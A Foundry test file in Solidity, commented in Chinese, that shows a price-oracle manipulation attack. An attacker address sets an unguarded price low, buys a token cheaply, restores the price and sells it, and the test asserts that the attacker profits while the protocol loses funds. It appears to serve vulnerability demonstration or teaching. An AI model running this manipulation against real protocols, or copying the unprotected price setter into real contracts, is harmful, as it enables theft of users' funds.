// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import {Test} from "forge-std/Test.sol";
import {PriceOracleManipulation} from "../src/PriceOracleManipulation.sol";

// ==================== 预言机操纵攻击验证 ====================
contract PriceOracleTest is Test {
    function test_ManipulatedPriceEnablesArbitrage() public {
        PriceOracleManipulation oracle = new PriceOracleManipulation();
        oracle.setPrice(1 ether); // 初始 1 ETH = 1 token

        // 正常用户以 1 ETH 买入 1 token
        vm.deal(address(this), 1 ether);
        oracle.buy{value: 1 ether}();
        assertEq(oracle.balances(address(this)), 1e18, "bought 1 token");

        // 攻击者把价格压到 0.01 ETH（单池瞬时价格可被任意设置）
        vm.prank(address(0xBAD));
        oracle.setPrice(0.01 ether);

        // 攻击者用 0.01 ETH 买入 1 token
        vm.deal(address(0xBAD), 1 ether);
        vm.prank(address(0xBAD));
        oracle.buy{value: 0.01 ether}();

        // 价格恢复后卖出 1 token 得 1 ETH
        vm.prank(address(0xBAD));
        oracle.setPrice(1 ether);
        vm.prank(address(0xBAD));
        oracle.sell(1e18);

        // 攻击者净赚 ~0.99 ETH，协议资金流失
        assertGt(address(0xBAD).balance, 1 ether, "attacker profited");
        assertLt(address(oracle).balance, 1 ether, "protocol lost funds");
    }
}
